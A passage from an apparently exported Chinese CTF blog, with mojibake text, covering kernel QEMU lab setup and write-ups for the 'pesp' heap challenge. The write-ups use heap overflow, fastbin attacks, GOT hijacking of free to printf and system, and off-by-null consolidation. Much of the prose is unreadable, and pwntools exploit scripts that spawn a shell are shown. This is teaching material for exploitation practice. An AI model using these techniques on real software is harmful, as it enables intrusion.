apt-get install flex\nsudo apt-get install libelf-dev\nsudo apt-get install libncurses5-dev libssl-dev \nsudo apt-get install build-essential openssl \nsudo apt-get install zlibc minizip \nsudo apt-get install libidn11-dev libidn11\n```\n\nå¯èƒ½æœ‰äº›é‡å¤çš„ï¼Œæ²¡äº‹ï¼Œå¤Ÿç¼–è¯‘ç¯å¢ƒå°±è¡Œã€‚\n\n2.ä¸‹è½½kernelæºç ï¼Œè§£å‹ï¼Œç¼–è¯‘ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nwget https://mirror.tuna.tsinghua.edu.cn/kernel/-------------------\ntar -zvxf linux-4.4.70.tar.gz\ncd linux-4.4.70\nmake menuconfig\n//è¿™é‡Œè¿›å…¥ä¹‹åç›´æ¥escä¿å­˜é€€å‡ºå³å¯ï¼Œç›¸å…³çš„è®¾ç½®æ¥åˆ°ä¹‹åç”Ÿæˆçš„.configä¸­æ¥\n\nvim .config\n//å°†CONFIG_MODULE_SIG_ALL,CONFIG_MODULE_SIG_KEYå’ŒCONFIG_SYSTEM_TRUSTED_KEYSä¸‰é¡¹æ³¨é‡Šæ‰ï¼Œç¼–è¯‘æ—¶ç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€æ¬¡æ€§å¯†é’¥æ¥åŠ å¯†ï¼Œå¦å¤–è®°å¾—æŠŠCONFIG_DEBUG_INFO=yå»æ‰ï¼Œä¸ç„¶æ–°å†…æ ¸å¸¦debugä¿¡æ¯è¶…å¤§\n//è¿™é‡Œè¸©è¿‡å¾ˆå¤šå‘ï¼Œè™šæ‹Ÿæœºç›´æ¥çˆ†ç‚¸ï¼Œå„ç§é”™è¯¯ã€‚\n\nmake\n```\n\nä½†æ˜¯å¦‚æœéœ€è¦ç›´æ¥è°ƒè¯•ï¼Œåˆ™çœ‹å¤§ä½¬çš„å§ï¼š\n\nhttps://eternalsakura13.com/2018/04/13/qemu/\n\nç¼–è¯‘å®Œæˆä¹‹ååœ¨linux-4.4.70/arch/x86_64/boot/ä¸‹ä¿å­˜bzImageï¼Œç”¨æ¥å¯åŠ¨qemuï¼Œæ ¹ç›®å½•ä¸‹æœ‰vmlinuxï¼Œç”¨æ¥åˆ†æã€‚\n\n3.ä¸‹è½½busyboxæºç ï¼Œè§£å‹ï¼Œç¼–è¯‘ï¼Œåˆ¶ä½œæ ¹ç›®å½•ç³»ç»Ÿ\n\n```\n//æ³¨é‡Šå¤´\n\nwget https://busybox.net/downloads/busybox-1.19.4.tar.bz2\ntar -jxvf busybox-1.30.0.tar.bz2\ncd busybox-1.30.0\nmake menuconfig \n# Busybox Settings -> Build Options -> Build Busybox as a static binary\nmake install\n```\n\nä¹‹ååœ¨busybox-1.30.0/_install/ç›®å½•ä¸‹å°±æ˜¯æ ¹ç›®å½•æ–‡ä»¶ç³»ç»Ÿ\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191459296.jpeg)\n\nç„¶åå°±ç”¨cpioç”Ÿæˆä¸Šè¿°çš„rootfs.cpioï¼Œç”¨æ¥é…åˆbzImageå¯åŠ¨qemu\n\nfind ./* | cpio -H newc -o > rootfs.cpio\n\n4.å¯åŠ¨qemu:\n\n(1)å°†rootfs.cpioã€bzImageæ‹–åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹\n\n(2)åˆ¶ä½œå¯åŠ¨æ–‡ä»¶ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\ntouch boot.sh\nvim boot.sh\n```\n\n(3)å°†ä¸‹åˆ—ä»£ç æ‹·å…¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\nå›¾å½¢åŒ–ç•Œé¢-nographicå’Œconsole=ttyS0é…åˆä½¿ç”¨ï¼Œå¯åŠ¨ç•Œé¢å°±å˜æˆç»ˆç«¯ã€‚\n\næœ€å./boot.shå³å¯å¯åŠ¨qemuè™šæ‹Ÿæœºã€‚\n\n \n\n \n\n \n\n \n\n \n\n","tags":["kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pesp-heap_overflow-struct","url":"/2021/08/14/pesp-heap_overflow-struct/","content":"\n1.ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œé€šè¿‡å †æº¢å‡ºç›´æ¥æ”¹structï¼Œç„¶åæ›´æ”¹ç»“æ„ä½“chunklist[0].chunkä¸­ä¿å­˜çš„chunkåœ°å€ï¼Œä½¿å…¶æŒ‡å‘free_got_addrï¼Œå†é€šè¿‡ç¨‹åºä¸­çš„showå‡½æ•°å°±å¯ä»¥æ³„éœ²å‡ºfree_got_addrä¸­ä¿å­˜çš„freeçœŸå®åœ°å€ï¼Œä»è€Œè·å¾—libcçš„åŸºåœ°å€ã€‚å½“ç„¶ï¼Œè¿™å¾—è¦æ±‚å…ˆæœ‰ä¸€ä¸ªfreeæ¥è®©freeçš„å»¶è¿Ÿç»‘å®šå‘ç”Ÿã€‚\n\n2.ç”±äºè¿™é‡Œçš„chunkåœ°å€å·²ç»å˜æˆfree_got_addrï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä¿®æ”¹è¯¥chunkçš„å†…å®¹æ—¶ï¼Œå°±ç›¸å½“äºä¿®æ”¹gotè¡¨ä¸­å€¼ï¼Œä¹Ÿå°±ä¿®æ”¹äº†çœŸå®å‡½æ•°åœ°å€çš„å€¼ã€‚è¿™é‡Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥chunkå†…å®¹æ¥åŠ«æŒfreeçš„gotè¡¨ä¸ºsystemå‡½æ•°çœŸå®åœ°å€ï¼Œä»è€Œfreeä¸€ä¸ªå†…å®¹ä¸ºbinshçš„chunkæ¥getshellã€‚\n\n3.ç¼–å†™expï¼Œå¢åˆ æ”¹æŸ¥å‡½æ•°å°±ä¸å¤šè¯´äº†ã€‚\n\n(1)ç”³è¯·ä¸‰ä¸ªchunkï¼Œå…ˆå°†chunk1é‡Šæ”¾ï¼Œä¹‹åchunk0ç”¨æ¥å †æº¢å‡ºï¼Œä¿®æ”¹chunk1çš„fdï¼Œè¿›è¡Œfastbinsæ”»å‡»ï¼Œå°†fakechunkæ”¾åœ¨structå‰é¢æŸä¸ªä½ç½®ã€‚è¿™é‡Œç”¨åˆ°å­—èŠ‚é”™ä½ï¼ŒåŸç†ä¸€æ ·ï¼Œåˆ©ç”¨0x7fæ¥æ”»å‡»fastbinsã€‚å†è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œchunk1å’Œchunk3å°±å›æ¥ï¼Œè¿™é‡Œçš„chunk3å°±æ˜¯fakechunkäº†ã€‚ç°åœ¨å°±å¯ä»¥ä¿®æ”¹fakechunkä»è€Œä¿®æ”¹æ‰chunklist[0].chunkçš„å€¼ï¼Œä½¿å…¶æŒ‡å‘free_got_addrã€‚ä»è€Œè°ƒç”¨showå‡½æ•°æ³„éœ²freeçš„çœŸå®åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x60,\"\\x00\"*0x60) #chunk0\nadd(0x60,\"\\x11\"*0x60) #chunk1\nadd(0x60,'/bin/sh\\x00') #chunk2 binsh\n\nremove(1)\nchange(0,0x100,flat(\"\\x00\"*0x60,p64(0),p64(0x71),p64(bss)))#chunk0_overflow\nadd(0x60,\"\\x11\"*0x60)#get chunk1\nadd(0x60,flat(\"\\x00\"*0x3,p64(0x100),p64(free_got_addr)))#get fakechunk\nshow()\nio.recvuntil(\"0 : \")\nlibc_base = u64(io.recv(6).ljust(8,'\\x00')) - libc.sym['free']\n```\n\n(2)å†ä¿®æ”¹chunk0çš„å†…å®¹ä¸ºsystemçœŸå®åœ°å€ï¼Œè¿™æ ·å°±ç›¸å½“äºåŠ«æŒfreeçš„gotè¡¨ï¼Œä¹‹åé‡Šæ”¾æ‰chunk2å³å¯getshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsystem_libc = libc_base + libc.sym['system']\nputs = libc_base + libc.sym['puts']\nchange(0,0x100,flat(p64(system_libc,),p64(puts)))\nremove(2)\nio.interactive()\n```\n\nâ–²éœ€è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ï¼Œç”±äºreadå‡½æ•°è¯»å–ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€æ•°æ®æ—¶ä¸€å®šä¼šæœ‰ä¸€ä¸ª\\x0aåŠ å…¥è¿›å»ï¼Œè¿™é‡Œå¦‚æœä¸è€ƒè™‘è¿›å…¥ï¼Œfreeå‡½æ•°åé¢å°±æ˜¯putå‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆputå‡½æ•°çš„Gotè¡¨è¢«æ›´æ”¹ï¼Œä»è€Œæ— æ³•æˆåŠŸè°ƒç”¨putå‡½æ•°ã€‚è€Œç¨‹åºåœ¨å¾ªç¯ä½“ä¸­çš„èœå•éƒ¨åˆ†åˆä¸€å®šä¼šè°ƒç”¨putå‡½æ•°ï¼Œé‚£ä¹ˆè¿™æ ·å°±ä¼šé€ æˆç¨‹åºå´©æºƒã€‚æ‰€ä»¥éœ€è¦å°†putå‡½æ•°ä¹ŸåŠ å…¥è¿›å»ï¼Œä½†æ˜¯è¿™æ ·åˆä¼šé€ æˆputå‡½æ•°ä¸‹ä¸€ä¸ªå‡½æ•°è¢«è¦†ç›–\\x0aã€‚ä¸è¿‡ä¸è¦ç´§ï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°putå‡½æ•°ä¸‹ä¸€ä¸ªå‡½æ•°æ˜¯stack_chk_failå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥canaryå‡ºé”™æ—¶æ‰ä¼šè°ƒç”¨ã€‚æˆ‘ä»¬æœ‰æ²¡æœ‰æ ˆæº¢å‡ºä¿®æ”¹canaryï¼Œè¿™ä¸ªå‡½æ•°å½“ç„¶ä¸ä¼šè¢«è°ƒç”¨ï¼Œç¨‹åºå°±ä¸ä¼šå´©æºƒã€‚\n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwnå †-åˆ·é¢˜æŠ€å·§"]},{"title":"pesp_heap-overflow","url":"/2021/08/14/pesp_heap-overflow/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†canaryå’ŒNXï¼ŒPartial RELROã€‚å¼€IDAæ‰¾æ¼æ´ï¼Œchangeå‡½æ•°ä¸­å­˜åœ¨å †æº¢å‡º:\n\n```\n#æ³¨é‡Šå¤´\n\nint v0; // ST08_4\nchar nptr; // [rsp+20h] [rbp-10h]\nchar buf; // [rsp+10h] [rbp-20h]\n----------------------------------------------------------\nprintf(\"Please enter the index of servant:\");\nread(0, &buf, 8uLL);\nv2 = atoi(&buf);\n--------------------------------------------------------------\nprintf(\"Please enter the length of servant name:\", &buf);\nread(0, &nptr, 8uLL);\nv0 = atoi(&nptr);\n```\n\nå¯ä»¥å‘ç°changeå‡½æ•°ä¸­ï¼Œå¹¶æ²¡æœ‰æ£€æŸ¥å †å—çš„å¤§å°ï¼Œæˆ‘ä»¬è¾“å…¥å¤šå°‘ï¼Œå®ƒå°±è®¤ä¸ºæ˜¯å¤šå°‘ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åˆ¶é€ å †æº¢å‡ºã€‚\n\n2.è¿™é¢˜æœ‰å¾ˆå¤šå…¶å®ƒæ¼æ´ï¼Œè¿™é‡Œå…ˆåªåˆ©ç”¨å †æº¢å‡ºæ¥æ€è€ƒä¸‹ã€‚\n\n(1)å…ˆç”³è¯·ä¸¤ä¸ªchunkï¼Œchunk1å’Œchunk2ï¼Œç„¶åä¿®æ”¹chunk1çš„å¤§å°å’Œå†…å®¹ï¼Œä½¿å¾—æº¢å‡ºæ•°æ®ï¼Œå°†chunk2çš„fdæ”¹æˆgotè¡¨ä¸­åœ°å€ï¼Œä¹‹åé‡Šæ”¾æ‰chunk2ï¼Œä½¿å…¶åœ¨fastbinsä¸­çš„ç»“æ„ä¸º:\n\n```\n#æ³¨é‡Šå¤´\n\nfastbins->chunk2\nchunk2.fd=got_addrã€‚\n```\n\nè¿™æ ·å°±å¯ä»¥å†ç”³è¯·chunk_aï¼Œchunk_bï¼Œè¿™é‡Œçš„chunk_aå°±æ˜¯ä»fastbinsä¸­ç”³è¯·å›æ¥çš„chun2ï¼Œè€Œchunk_bçš„é¦–åœ°å€å°±æ˜¯got_addrã€‚ä¹‹åé€šè¿‡ä¿®æ”¹chunk_bçš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹gotè¡¨ä¸­çš„å†…å®¹ï¼Œä»è€ŒåŠ«æŒgotè¡¨ã€‚\n\n(2)ç”±äºè¿™é‡Œå¼•å…¥äº†printfå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥å°†freeå‡½æ•°çš„gotè¡¨åŠ«æŒä¸ºprintf(plt)å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨freeä¸€ä¸ªchunkæ—¶åˆ¶é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹chunkå†…å®¹ä¸ºéœ€è¦çš„æ ¼å¼åŒ–å­—ç¬¦ä¹‹åï¼Œå†é€šè¿‡è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸ŠæŸå‡½æ•°çš„Libcåœ°å€ï¼Œä»è€Œè®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼Œä»è€Œè®¡ç®—å¾—åˆ°systemå‡½æ•°çœŸå®åœ°å€ã€‚\n\n(3)ä¹‹åå†é€šè¿‡ä¸Šè¿°æ–¹æ³•ï¼Œå°†free_gotåŠ«æŒä¸ºsystem_real_addrï¼Œä¹‹åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸ºbinshå­—ç¬¦ä¸²çš„chunkï¼Œå°±ç›¸å½“äºè°ƒç”¨system(\"/bin/sh\")ï¼Œä»è€Œgetshellã€‚\n\n3.å¼€å§‹ç¼–å†™payload\n\n(1)é¦–å…ˆç¡®å®šå¢åˆ æ”¹æŸ¥å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef show():\n    io.sendlineafter(\"choice:\",\"1\")\n\ndef add(length,cont):\n    io.sendlineafter(\"choice:\",\"2\")\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef edit(idx,length,cont):\n    io.sendlineafter(\"choice:\",\"3\")\n    io.sendlineafter(\":\",str(idx))\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef delete(idx):\n    io.sendlineafter(\"choice:\",\"4\")\n    io.sendlineafter(\":\",str(idx))\n```\n\n(2)å°è¯•ä¿®æ”¹gotè¡¨ï¼Œåˆ¶é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡ºæ¼æ´\n\n```\n#ç”³è¯·ä¸‰ä¸ªchunkï¼Œchunk0,chunk1,chunk2åŒ…æ‹¬ä¹‹åéœ€è¦çš„æ ¼å¼åŒ–å­—ç¬¦ã€‚\nadd(0x50,'000000')\nadd(0x50,'111111')\nadd(0x10,\".%17$p.\")\n#64ä½ç¨‹åºï¼Œå°†æ–­ç‚¹ä¸‹åœ¨changeå‡½æ•°ä¸­çš„call freeï¼Œè§‚å¯Ÿæ­¤æ—¶æ ˆä¸­æ•°æ®ï¼Œå¯ä»¥å‘ç°ä»rspå¾€ä¸‹æ•°12æ˜¯libc_main_addrï¼Œè®¡ç®—åç§»ä¸º12+6-1=17.\n\n#é‡Šæ”¾chunk1,ä¹‹åä¿®æ”¹chunk1çš„fdä½ä½¿å…¶æŒ‡å‘fakechunk\ndelete(1)\nedit(0,0x100,flat('0'*0x50,'00000000',0x61,0x601ffa))\n#è¿™é‡Œä¸¤æ¡ä»£ç é¡ºåºä¸èƒ½æ”¹å˜ï¼Œå› ä¸ºå½“chunk1è¢«é‡Šæ”¾æ—¶ï¼Œå…¶fdä½ä¼šå‘ç”Ÿæ”¹å˜ï¼ŒæŒ‡å‘0x0ï¼Œç¬¬ä¸€ä¸ªè¿›å…¥fastbinsçš„chunkå…¶fdåªè¦ä¸è¢«ä¿®æ”¹ï¼Œä¸€ç›´éƒ½æ˜¯æŒ‡å‘0x0ã€‚æ‰€ä»¥éœ€è¦å…ˆé‡Šæ”¾ï¼Œå†ä¿®æ”¹ï¼Œé˜²æ­¢ä¹‹åfdè¢«ä¿®æ”¹æŒ‡å‘0x0ã€‚\n#ç°åœ¨fastbinsä¸º:fastbinsY[0]->chunk1->fakechunk\n\n#è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œå°†chunk1å’Œfakechunkç”³è¯·å›æ¥ï¼ŒåŒæ—¶åŠ«æŒgotè¡¨ï¼Œå°†freeå‡½æ•°çš„gotè¡¨å€¼æ”¹æˆprintfçš„pltè¡¨å€¼ï¼Œè°ƒç”¨pltè¡¨ä¸­ä»£ç ï¼Œä»è€Œè°ƒç”¨printfå‡½æ•°ã€‚\nadd(0x50,'xxxxxxxx')\nadd(0x50,flat(\"\\0\"*0xe,flat(elf.sym[\"printf\"])[:6]))#get fakechunk,change got\n\n#é‡Šæ”¾chunk2ï¼Œè§¦å‘freeå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åŠ«æŒåçš„printfå‡½æ•°ï¼Œå¾—åˆ°æ ˆä¸Šåœ°å€libc_main_addrï¼Œè®¡ç®—å¾—åˆ°libc_address\ndelete(2)\nio.recvuntil(\".\")\ntemp = io.recvuntil(\".\",drop=True)\nlibc_address = int(temp,16) - 0x20840\n```\n\n(3)å†æ¬¡åŠ«æŒgotè¡¨ä¸ºsystemå‡½æ•°ï¼Œé‡Šæ”¾Binshå­—ç¬¦chunkï¼Œgetshell\n\n```\n#æ³¨é‡Šå¤´\n\n#è¿™é‡Œçš„chunk3å°±æ˜¯fakechunkï¼Œä¹Ÿå°±æ˜¯gotè¡¨\nedit(3,0x50,flat('\\0'*14,flat(libc_address+libc.sym['system'])[:6]))\nadd(0x10,\"/bin/sh\\0\")\n#ç”±äºå‰ä¸€ä¸ªé‡Šæ”¾çš„æ˜¯chunk2ï¼Œæ‰€ä»¥è¿™é‡Œå†æ¬¡ç”³è¯·å›æ¥çš„ç´¢å¼•è¿˜æ˜¯2ï¼Œå¯ä»¥å¤šæ¬¡è¿è¡Œç¨‹åºå°è¯•å°±å¯ä»¥çŸ¥é“ï¼Œå½“å‰é¢æŸä¸ªçš„chunkä¸ºç©ºæ—¶ï¼Œç”³è¯·çš„chunkä¼šå…ˆå¡«æ»¡å‰é¢çš„ç©ºçš„chunkç´¢å¼•ã€‚\ndelete(2)\nio.interactive()\n```\n\nâ–²åˆ¶é€ fakechunkæ—¶ï¼Œéœ€è¦è®¾ç½®åˆæ³•çš„sizeï¼Œä¸ç„¶å¦‚æœfastbinsä¸­çš„chunk.fdæŒ‡å‘fakechunkï¼Œè€Œfakechunkçš„å¤§å°åˆä¸æ˜¯è¯¥fastbinsç»„ä¸­ï¼Œé‚£ä¹ˆç¨‹åºä¼šå´©æºƒã€‚æ‰€ä»¥åœ¨æœ€å¼€å§‹è®¾ç½®å¤§å°æ—¶ï¼Œå°±éœ€è¦å¥½å¥½è®¡ç®—ä»¥ä¸‹ï¼Œé€šè¿‡è°ƒè¯•çœ‹çœ‹gotè¡¨ä¸­åœ¨freeå‡½æ•°å‰èƒ½ä¸èƒ½æ‰¾åˆ°è¿˜æ²¡è¢«å»¶è¿Ÿç»‘å®šçš„å‡½æ•°å¯ä»¥ç¡®å®šè®¡ç®—å¤§å°ï¼Œæˆ–è€…çœ‹å…¶å®ƒå‡½æ•°çš„gotè¡¨æœ€åä¸‰ä½ä¹Ÿå¯ä»¥ï¼Œè¿™æ ·æ‰èƒ½åˆ¶é€ åˆæ³•sizeä½¿å¾—ç¨‹åºä¸ä¼šå´©æºƒã€‚è¿™é‡Œç”¨åˆ°çš„0x601ffaå°±æ˜¯è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°èƒ½ç”¨çš„ï¼Œå¹¶ä¸”è¿˜éœ€è¦å¡«å……0xeï¼Œä¹Ÿå°±æ˜¯14ä¸ªå­—èŠ‚ã€‚\n","tags":["overflow"],"categories":["PWN","pwnå †-overflow"]},{"title":"pesp_off-by-null","url":"/2021/08/14/pesp_off-by-null/","content":"\n1.è¿˜æ˜¯ä¹‹å‰çš„2018ç½‘é¼æ¯çš„pespé¢˜ç›®ã€‚è¿™é‡Œå‡è®¾æ²¡æœ‰å †æº¢å‡ºï¼Œæœ‰PIEä¿æŠ¤ï¼Œæ— æ³•åŠ«æŒgotè¡¨ã€‚åªä½¿ç”¨0å­—èŠ‚æº¢å‡ºæ¼æ´æ¥è·å–libcåœ°å€ï¼Œå†æ ¹æ®å¾—åˆ°çš„libcåœ°å€æ¥æ›´æ”¹malloc_hookå’Œrealloc_hooké‡Œé¢ä¿å­˜çš„åœ°å€ä¸ºone_gadgetï¼Œä¸€æ­¥getshellã€‚(realloc_hookä¸ºonegadgetï¼Œmalloc_hookä¸º__libc_reallocå‡½æ•°ä¸­è°ƒæ•´æ ˆå¸§çš„åœ°æ–¹)\n\n2.å…ˆæ¢³ç†ä¸€ä¸‹0å­—èŠ‚æº¢å‡ºæ¼æ´ï¼Œä¸€èˆ¬çš„chunkæ”¹å†…å®¹éƒ½æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nread(0, chunk_ptr, size);\n```\n\nè¿™æ ·å°±åªèƒ½è¾“å…¥sizeè¿™ä¹ˆå¤§çš„å†…å®¹ï¼Œä½†æ˜¯è¿™é“é¢˜ä¸­ï¼Œåœ¨addå‡½æ•°ä¸­å’Œchangeå‡½æ•°ä¸­ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg)\n\nå¯ä»¥çœ‹åˆ°ç»™chunkæ·»åŠ å†…å®¹çš„è¯­å¥éƒ½æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null\n```\n\nè¿™æ ·å½“æˆ‘ä»¬å°†chunkå†…å®¹é¡¶æ»¡ä¹‹åï¼Œç¨‹åºä¼šå°†chunkæŒ‡é’ˆæœ€åéƒ¨åˆ†å†æº¢å‡ºä¸€ä¸ªå­—èŠ‚èµ‹å€¼ä¸º0ï¼Œè¿™å°±æ˜¯off-by-nullã€‚\n\nç”±äºscanfå‡½æ•°ä¼šåœ¨æœ«å°¾è‡ªåŠ¨è¡¥\\x00ï¼Œè¿™å…¶å®ä¹Ÿæ˜¯ä¸€ç§off-by-nullï¼Œ\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf[10];\nscanf(\"10%s\",buf);\n```\n\n \n\nâ–²freeæºç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long ) prevsize));\n    unlink(av, p, bck, fwd);\n}\n```\n\nä¹Ÿå°±æ˜¯å¦‚æœå½“å‰chunkçš„IN_USEä½ä¸º0ï¼Œé‚£ä¹ˆå°±æ ¹æ®å½“å‰chunkçš„pre_sizeä½ï¼Œæ‰¾åˆ°å‰ä¸€ä¸ªchunk_preï¼Œå°†chunk_preçš„sizeä½æ”¹æˆsize+pre_sizeï¼Œé€šè¿‡Unlinkå–å‡ºchunk_preï¼Œå‡†å¤‡åˆå¹¶ã€‚(ä¹‹åçš„æ£€æŸ¥ä»£ç ä¼šå†å¾ªç¯ï¼Œä¹Ÿå°±æ˜¯å†çœ‹chunk_preçš„IN_USEä½æ˜¯ä¸æ˜¯0æ¥åˆ¤æ–­è¦ä¸è¦å†å‘ä¸Šåˆå¹¶ï¼Œè¿™é‡Œä¸é‡è¦)\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡off-by-nullï¼Œæº¢å‡º0åˆ°chunk_nextçš„sizeä½ä¸­çš„IN_USEä½ï¼Œé‚£ä¹ˆå½“å‰chunkå°±ä¼šè¢«æ ‡è®°ä¸ºFreeï¼Œè¿™æ ·åœ¨Free(chunk_next)æ—¶ï¼Œå°±ä¼šå°†chunkå’Œchunk_nextåˆå¹¶ã€‚å¦‚æœæˆ‘ä»¬åˆæ›´æ”¹äº†chunk_nextçš„pre_sizeä½ï¼Œä½¿å®ƒå˜å¾—æ›´å¤§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‘ä¸Šåˆå¹¶æ›´å¤§çš„chunkå—ã€‚è¿™å°±æ˜¯off-by-nullçš„åˆ©ç”¨æ–¹æ³•ï¼Œè¿™é¢˜ä¸­å¦‚ä¸‹ï¼š\n\n(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæº¢å‡ºçš„æ˜¯ä¸€ä¸ªå­—èŠ‚è€Œä¸æ˜¯ä¸€ä¸ªBitï¼Œæ‰€ä»¥sizeä¸€èˆ¬éƒ½è®¾ç½®ä¸º0xf0ï¼Œä»è€Œä½¿sizeä½å˜æˆ0x101ï¼Œæº¢å‡ºä¹‹åè¿›è€Œå˜æˆ0x100ã€‚ä½†å¦‚æœsizeæœ€å¼€å§‹è®¾ç½®ä¸º0x20ï¼Œsizeä½å°±æ˜¯0x30ï¼Œæº¢å‡º0å­—èŠ‚å°±ä¼šå˜æˆ0x00ï¼Œé‚£æ ·ç¨‹åºç…§æ ·å´©æºƒã€‚)\n\n(1)å…ˆç”³è¯·å››ä¸ªchunkï¼Œåˆ†åˆ«ä¸ºchunk0,chunk1,chunk2,chunk3ã€‚(chunk3é˜²æ­¢åˆå¹¶ç”¨)\n\n(2)ç„¶åfreeæ‰chunk0ï¼Œ(è¿™é‡Œchunk0éœ€è¦è¶³å¤Ÿå¤§ï¼Œä¸€èˆ¬å¾—å¤§äº0x80ï¼Œä¹Ÿå°±æ˜¯MAX_fastbins)ï¼Œä½¿å…¶è¿›å…¥unsortedbinsä¸­ã€‚(è¿™é‡Œå¿…é¡»freeæ‰chunk0ï¼Œä¸ç„¶ä¹‹åä¿®æ”¹æ‰chunk2çš„pre_sizeä½æ—¶ï¼Œç„¶åfreeæ‰chunk2æ—¶ï¼Œç¨‹åºä¾æ®pre_sizeæ¥åˆ¤æ–­æ˜¯å¦åˆå¹¶æ—¶ï¼Œå‘ç°chunk0ä»æ—§å¤„äºä½¿ç”¨å½“ä¸­ï¼Œä½†pre_sizeåŒ…å«äº†chunk0ï¼Œå°±ä¼šé€ æˆç¨‹åºå´©æºƒ)\n\n(3)ä¿®æ”¹chunk1çš„æœ€åå…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯chunk2çš„pre_sizeä½ï¼Œä½¿å¾—chunk2çš„pre_sizeä½çš„å¤§å°ä¸ºchunk0_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk2ï¼Œä½¿å¾—chunk0,chunk1,chunk2ä¸‰ä¸ªchunkä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«åˆå¹¶ä¹‹åæ”¾å…¥åˆ°unsortedbinsä¸­ï¼Œè°ƒè¯•è¿‡ç¨‹å¯ä»¥å‘ç°ï¼Œchunk0çš„sizeä½è¢«ä¿®æ”¹æˆäº†sizeof(chunk0+chunk1+chunk2)ã€‚ä½†æ˜¯è¿™é‡Œå®é™…æƒ…å†µä¸­ï¼Œchunk1å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œåªæ˜¯å®ƒçš„å†…å­˜å¤„åœ¨è¢«é‡Šæ”¾çš„å†…å­˜ä¸­é—´ï¼Œä¾ç„¶å¯ä»¥é€šè¿‡chunk1çš„æŒ‡é’ˆæ¥æ“ä½œã€‚ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªç¨‹åºä¸­ä¾æ—§å¯ä»¥è¿›è¡Œeditæ¥ä¿®æ”¹chunk1ï¼Œæˆ–è€…showæ¥æ‰“å°chunk1ã€‚\n\n(5)å†æ¬¡ç”³è¯·chunk0å¤§å°ï¼Œè¿™æ ·å°±ä¼šå‰²è£‚unsortedbinsä¸­çš„remainderä¸ºchunk0+new_remainderï¼ŒæŠŠchunk0ç”³è¯·å›æ¥ï¼Œå‰©ä¸‹çš„new_remainderä¾æ—§æ”¾åœ¨unsortedbinsä¸­ã€‚åœ¨unsortedbinsä¸­çš„remainderæœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯è¯¥chunkçš„fdå’Œbkä¸€å®šæŒ‡å‘unsortedbinsé“¾è¡¨å¤´éƒ¨ï¼Œ(å¦‚æœæœ‰å¤šä¸ªremainderï¼Œé‚£ä¹ˆé¡ºåºç±»ä¼¼äºsmallbinsï¼Œä¾æ—§å¯ä»¥ä½¿ç”¨ç¬¬ä¸€ä¸ªchunkçš„bkæ¥è·å–unsortedbinsé“¾è¡¨å¤´éƒ¨)\n\n(6)é‚£ä¹ˆç°åœ¨unsortedbinsä¸­æœ‰chunk1å’Œchunk2ï¼Œè€Œchunk1çš„fdå’Œbkéƒ½æŒ‡å‘unsortedbinsé“¾è¡¨å¤´éƒ¨ï¼Œå¹¶ä¸”åœ¨ç¨‹åºä¸­chunk1ä»æ—§å¤„äºä½¿ç”¨çŠ¶æ€ï¼